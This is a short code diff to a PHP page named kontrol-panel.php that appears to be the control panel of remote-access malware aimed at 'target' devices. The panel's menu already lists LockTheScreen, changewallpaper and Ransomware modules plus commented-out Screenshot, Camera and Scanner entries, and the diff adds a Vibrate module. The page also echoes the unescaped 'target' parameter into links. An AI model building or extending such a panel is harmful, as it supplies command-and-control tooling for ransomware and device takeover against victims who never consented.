@@ -78,6 +78,7 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=82" class="list-group-item <?php if ($_GET['type']==82){ echo 'active';}?>">LockTheScreen</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=83" class="list-group-item <?php if ($_GET['type']==83){ echo 'active';}?>">changewallpaper</a>
                 <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=84" class="list-group-item <?php if ($_GET['type']==84){ echo 'active';}?>">Ransomware</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=85" class="list-group-item <?php if ($_GET['type']==85){ echo 'active';}?>">Vibrate</a>
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a> -->
                 <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a> -->
                 <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Scanner</a> -->
@@ -121,6 +122,8 @@ if (!isset($_GET['target']) || !isset($_GET['type'])){
                 include './modules/changewallpaper.php'; 
             } elseif ($_GET['type']==84){
                 include './modules/ransomware.php'; 
+            } elseif ($_GET['type']==85){
+                include './modules/vibrate.php'; 
             } elseif ($_GET['type']==9){
 
             } elseif ($_GET['type']==10){
